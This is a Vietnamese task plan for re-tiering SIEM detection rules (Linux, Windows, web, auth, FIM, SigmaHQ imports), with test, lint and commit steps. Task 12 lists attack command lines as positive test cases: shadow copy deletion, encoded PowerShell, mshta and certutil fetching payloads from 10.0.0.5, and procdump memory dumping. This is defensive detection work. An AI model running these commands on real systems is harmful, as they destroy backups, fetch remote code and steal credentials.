- [ ] **Step 3: Sửa `linux.yml`.** Viết lại LNX-003 (severity medium) và thêm LNX-003-L (low, shadow, `shadow_since`, `suppress: 3600`, `group_by: [agent.id]`) đúng như bảng. Mô tả trong khóa `falsepositives` nêu rõ: bộ cài chính thức chỉ còn bắn ở bậc `-L`.
- [ ] **Step 4: Chạy.** `python ../tools/rule_lint.py` và `pytest tests/test_pipeline.py tests/test_rule_lint.py -q`. Kỳ vọng: PASS, kể cả test hồi quy cũ `test_pipeline.py:200-233`.
- [ ] **Step 5: Commit** `LNX-003: tách bậc -L (không danh sách cho phép) và gốc medium; sửa lỗ lách danh sách cho phép`.

## Task 8: Họ thử nghiệm WIN-005

**Files:**
- Modify: `server/rules/windows.yml`, `server/rules/cases/windows.yml`
- Test: `server/tests/test_pipeline.py`

- [ ] **Step 1: Viết ca test trước.**
  - Thêm các ca của dòng WIN-005 trong bảng.
  - Thêm `test_win005_tier_via_real_parser`: một event Sysmon EID 1 đi qua parser thật (dùng helper `win(...)` của `test_pipeline.py`) với `powershell.exe /enc <base64>`; kỳ vọng `WIN-005-L` và `WIN-005` cùng bắn. Event phải có `agent.id` sau khi qua parser, đây là Review Focus 1.
- [ ] **Step 2: Chạy lint và test.** Kỳ vọng: FAIL.
- [ ] **Step 3: Sửa `windows.yml`.** Làm theo bảng; WIN-005 hạ xuống medium.
- [ ] **Step 4: Chạy.** `python ../tools/rule_lint.py` và `pytest -q`. Kỳ vọng: PASS. Chỉ được fail test đã biết ở mục Global Constraints.
- [ ] **Step 5: Commit** `WIN-005: bậc -L bắt mọi dạng cờ (windash, đổi tên); gốc medium giữ loại trừ Ansible`.

## Task 9: Windows — chuyển các họ còn lại và tách rule

**Files:**
- Modify: `server/rules/windows.yml`, `server/rules/cases/windows.yml`
- Modify: `server/config/playbooks.yml` (danh sách diệt tiến trình: `WIN-006` → `WIN-014`)
- Modify: `server/config/case_playbooks.yml` (thêm `WIN-014` vào playbook đang khớp WIN-006, thêm `WIN-015` vào playbook đang khớp WIN-007; kiểm bằng lint)
- Modify: `server/siem/pipeline/normalize.py:421-424` (`put(doc, "group.id", f.get("TargetSid"))`)
- Test: `server/tests/test_pipeline.py`

- [ ] **Step 1: Viết ca test trước.**
  - Ca test cho WIN-003, 004, 006, 007, 008, 009, 010, 012, 013, 014, 015 theo bảng.
  - Thêm `test_group_member_added_keeps_group_sid`: event 4732 có `TargetSid` S-1-5-32-544, sau `normalize` thì `group.id == "S-1-5-32-544"`.
  - Sửa event 4732 trong `test_windows_rules` (`test_pipeline.py:175`): thêm `"TargetSid": "S-1-5-32-544"`. Nếu không, WIN-004 (so theo SID) sẽ không bắn ở vòng kiểm dòng 184.
- [ ] **Step 2: Chạy lint và test.** Kỳ vọng: FAIL đúng ở các ca mới.
- [ ] **Step 3: Cài đặt.** Sửa YAML theo bảng, sửa hai file playbook, sửa `normalize.py`.
- [ ] **Step 4: Chạy.** `python ../tools/rule_lint.py` (gồm kiểm phản ứng tự động của Task 3) và `pytest -q`. Kỳ vọng: PASS. Đọc lại thay đổi `severity` của từng rule trong `test_pipeline.py:184` (WIN-002/004/005/008/010 vẫn phải bắn).
- [ ] **Step 5: Commit** `Windows: phân bậc WIN-005..013, tách WIN-014 (4104) và WIN-015 (truy cập LSASS), WIN-004 so theo SID`.

## Task 10: Linux, Web, Auth, Mạng, FIM — chuyển các họ còn lại

**Files:**
- Modify: `server/rules/{linux,web,auth,network,fim}.yml` và các file tương ứng trong `server/rules/cases/`
- Modify: `wazuh/manager/agent.conf` (thêm thư mục syscheck cho FIM-001-L: `/etc/ld.so.conf.d`, `/etc/update-motd.d`, `/etc/xdg/autostart`, `/etc/init.d`, `/usr/lib/systemd/system`, `/etc/environment`, `/etc/bash.bashrc`, `/root/.bashrc`; khóa registry `Winlogon`, `Image File Execution Options`, `Policies\Explorer\Run`)
- Test: `server/tests/test_pipeline.py`, `server/tests/test_fim_rules.py`

- [ ] **Step 1: Viết ca test trước** cho mọi dòng LNX-001/002/005/006, WEB-001/003/004/005/006/007, AUTH-004/005/006/007, NET-001/002/004, FIM-001 trong bảng. Trong đó có ca âm Jenkins (java → sh) cho LNX-002 và 10× POST `/oauth/token` cho WEB-007.
- [ ] **Step 2: Chạy lint và test.** Kỳ vọng: FAIL đúng ở các ca mới.
- [ ] **Step 3: Cài đặt** theo bảng và sửa `agent.conf`.
- [ ] **Step 4: Chạy.** `python ../tools/rule_lint.py` và `pytest -q`. Kỳ vọng: PASS. Kiểm riêng `test_fim_rules.py`: `covered_by` vẫn trả `FIM-001` khi FIM-001 chạy chính thức.
- [ ] **Step 5: Commit**, mỗi lĩnh vực một commit, ví dụ `Linux: phân bậc LNX-001/002/006; LNX-002 bỏ cha java/php khỏi bậc diệt tiến trình`.

## Task 11: SigmaHQ — nhập theo bậc và nhập đích danh

**Files:**
- Modify: `tools/sigmahq_import.py` (`candidates`, phần ghi YAML, argparse)
- Test: `server/tests/test_sigmahq_import.py`; nếu chưa có file test cho công cụ nhập thì tạo mới

**Interfaces:**
- Produces: `tier_for(level: str) -> str` với `{"medium": "low", "high": "medium", "critical": "high"}`; CLI `--ids <uuid,...>`.

- [ ] **Step 1: Viết test fail.**
  - `test_tier_for_lowers_one_level`: kiểm 3 cặp ánh xạ.
  - `test_low_candidate_skips_playbook_requirement`: rule level medium có kỹ thuật chưa có playbook vẫn thành ứng viên, với `severity == "low"`, `suppress == 3600`, `group_by == ["agent.id"]`.
- [ ] **Step 2: Chạy.** Kỳ vọng: FAIL.
- [ ] **Step 3: Cài đặt.**
  - `candidates` dùng `tier_for(row["level"])`; chỉ kiểm playbook khi bậc từ medium trở lên.
  - Rule low thêm `suppress` và `group_by`.
  - `--ids` ép chọn đúng các id đó, bỏ qua bước chọn tham lam theo số mẫu bắt được.
  - Rule chọn bằng `--ids` mà không bắt mẫu dataset nào: không sinh ca dương, in cảnh báo `"<id>: cần ca dương viết tay"`. Ca âm vẫn sinh như cũ.
- [ ] **Step 4: Chạy test**, rồi chạy công cụ ở chế độ chỉ đo (không `--write`) và ghi số rule nhập được theo từng bậc.
- [ ] **Step 5: Commit** `sigmahq_import: hạ một bậc khi nhập, rule low không cần case playbook, --ids nhập đích danh`.

## Task 12: SigmaHQ — chuyển bậc lô 1 và nhập lô thay thế

**Files:**
- Modify: `server/rules/sigmahq/lo-01.yml` (chỉ `severity`, `suppress`, `group_by`)
- Create: `server/rules/sigmahq/lo-02.yml`, `server/rules/cases/sigmahq-lo-02.yml` (do công cụ sinh)

- [ ] **Step 1:** Đổi `severity` cho 30 rule của lô 1 bằng `tier_for` qua một đoạn Python dùng một lần, không sửa tay từng rule. Rule thành low thì thêm `suppress: 3600`, `group_by: [agent.id]`.
- [ ] **Step 2:** Lấy id của 9 rule thuộc lô thay thế (mục *SigmaHQ*) trong `datasets/raw/sigma_all_rules.zip`, rồi chạy `python tools/sigmahq_import.py --ids <9 id> --write`.
- [ ] **Step 3:** Với rule mà công cụ báo "cần ca dương viết tay", thêm ca dương vào `rules/cases/sigmahq-lo-02.yml` từ các biến thể ngày 21/10. Event Sysmon EID 1 cần có `process.executable` thật, vì thiếu trường này nhiều rule SigmaHQ khớp sai.
  - Shadow Copies Deletion…: `"C:\Windows\System32\vssadmin.exe" delete shadows /all /quiet`, `vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB`
  - Deletion of Volume Shadow Copies via WMI with PowerShell: `powershell -c "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete()}"`
  - Suspicious Encoded PowerShell Command Line: `powershell.exe -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA`
  - Suspicious PowerShell Encoded Command Patterns; Potential Defense Evasion Via Rename…: `C:\Users\Public\p.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA`, `OriginalFileName` = `PowerShell.EXE`
  - Remotely Hosted HTA…: `"C:\Windows\System32\mshta.exe" "http://10.0.0.5/a.hta"`
  - Suspicious File Downloaded From Direct IP Via Certutil.EXE: `certutil.exe /urlcache /split /f http://10.0.0.5/a.exe a.exe`
  - Suspicious Microsoft OneNote Child Process: cha `…\ONENOTE.EXE`, con `cmd.exe /c a.bat`
  - Procdump Execution: `C:\Tools\procdump.exe -accepteula -ma 672 out.dmp`
- [ ] **Step 4:** Chạy `python tools/rule_lint.py` và `pytest -q`. Kỳ vọng: PASS, mọi ca dương vừa thêm đều đạt, tức 9/12 biến thể Windows bị lọt ngày 21/10 nay đã có rule bắt.
- [ ] **Step 5: Commit** `SigmaHQ: lô 1 hạ một bậc; lô 2 thay thế (9 rule bắt biến thể lách)`.

## Task 13: Đo, hiệu chỉnh, tài liệu (09–12/11, chỉ sửa lỗi)

**Files:**
- Modify: `RULES.md` (mục 2.2 định dạng mã/bậc, 2.11 lint mới, 3 bảng rule, 4 độ phủ hai dòng ≥ medium / mọi bậc)
- Modify: `SOC-OPERATIONS.md` mục 4 (bảng bậc, tiêu chí bật chính thức), `PLAYBOOKS.md` (danh sách diệt tiến trình), `Test.md`

- [ ] **Step 1:** Chạy `python -m siem.ai.benchmark --datasets ../datasets/processed --min-severity medium` và lặp lại với `--min-severity low`; ghi hai dòng vào `RULES.md` mục 4.
- [ ] **Step 2:** Trên log lab ≥ 7 ngày (việc 1.4), đếm alert/ngày/máy của từng rule `-L` bằng truy vấn ES `siem-alerts` (`rule.id` kết thúc bằng `-L`, `alert.shadow: true`). Rule nào đạt tiêu chí ở bảng Bậc thì commit đổi `mode: active`; rule vượt tiêu chí thì thu hẹp điều kiện hoặc để chạy bóng tiếp.
- [ ] **Step 3: Hiệu chỉnh RBA.**
  - Chạy `tools/e2e_test.py` trên stack: phải sinh RBA-001 cho máy bị tấn công nhiều bước.
  - Trên 7 ngày log lab bình thường: không được sinh RBA-001.
  - Nếu sai thì chỉnh `RBA_THRESHOLD` hoặc `RBA_MIN_RULES` trong `.env` và ghi lý do vào `SOC-OPERATIONS.md`.
- [ ] **Step 4:** Cập nhật tài liệu theo danh sách Files.
- [ ] **Step 5: Commit** `Tài liệu: mô hình phân bậc, số đo độ phủ theo bậc, tiêu chí bật rule -L`.
